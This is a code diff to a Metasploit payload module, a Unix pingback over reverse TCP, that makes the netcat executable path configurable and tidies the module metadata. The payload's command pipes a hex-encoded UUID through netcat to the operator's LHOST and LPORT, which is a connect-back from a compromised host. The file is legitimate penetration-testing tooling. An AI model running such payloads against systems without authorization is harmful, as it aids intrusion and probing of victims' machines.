@@ -14,26 +14,31 @@ module MetasploitModule
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'          => 'Unix Command Shell, Pingback Reverse TCP (via netcat)',
-      'Description'   => 'Creates a socket, send a UUID, then exit',
-      'Author'        =>
-        [
-          'asoto-r7'
-        ],
-      'License'       => MSF_LICENSE,
-      'Platform'      => 'unix',
-      'Arch'          => ARCH_CMD,
-      'Handler'       => Msf::Handler::ReverseTcp,
-      'Session'       => Msf::Sessions::Pingback,
-      'PayloadType'   => 'cmd',
-      'RequiredCmd'   => 'netcat'
+     'Name'          => 'Unix Command Shell, Pingback Reverse TCP (via netcat)',
+     'Description'   => 'Creates a socket, send a UUID, then exit',
+     'Author'        =>
+       [
+         'asoto-r7'
+       ],
+     'License'       => MSF_LICENSE,
+     'Platform'      => 'unix',
+     'Arch'          => ARCH_CMD,
+     'Handler'       => Msf::Handler::ReverseTcp,
+     'Session'       => Msf::Sessions::Pingback,
+     'PayloadType'   => 'cmd',
+     'RequiredCmd'   => 'netcat'
     ))
+    register_advanced_options(
+      [
+        OptString.new('NetcatPath', [true, 'The path to the Netcat executable', 'nc'])
+      ]
+    )
   end
 
   #
   # Constructs the payload
   #
-  def generate
+  def generate(_opts = {})
     super.to_s + command_string
   end
 
@@ -42,6 +47,6 @@ module MetasploitModule
   #
   def command_string
     self.pingback_uuid ||= self.generate_pingback_uuid
-    "printf '#{pingback_uuid.scan(/../).map { |x| "\\x" + x }.join}' | nc #{datastore['LHOST']} #{datastore['LPORT']}"
+    "printf '#{pingback_uuid.scan(/../).map { |x| "\\x" + x }.join}' | #{datastore['NetcatPath']} #{datastore['LHOST']} #{datastore['LPORT']}"
   end
 end
